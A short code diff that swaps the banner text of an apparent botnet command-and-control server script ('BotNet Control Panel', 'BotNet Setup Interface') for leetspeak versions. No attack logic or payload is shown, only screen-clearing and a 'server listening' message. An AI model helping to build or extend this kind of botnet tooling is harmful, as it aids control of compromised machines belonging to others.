@@ -20,7 +20,7 @@ class BotNetServer:
         os.system('cls' if os.name == 'nt' else 'clear')
         print(Fore.CYAN + """
         ╔════════════════════════════════════╗
-        ║          BotNet Control Panel      ║
+        ║          b0tn3t c0ntr0l p4n3l      ║
         ╚════════════════════════════════════╝
         """ + Style.RESET_ALL)
         print(Fore.GREEN + f"[*] Server listening on {self.host}:{self.listen_port}")
@@ -82,7 +82,7 @@ def main():
     os.system('cls' if os.name == 'nt' else 'clear')
     print(Fore.CYAN + """
     ╔════════════════════════════════════╗
-    ║       BotNet Setup Interface       ║
+    ║       b0tn3t s3tup 1nt3rf31s       ║
     ╚════════════════════════════════════╝
     """ + Style.RESET_ALL)
     
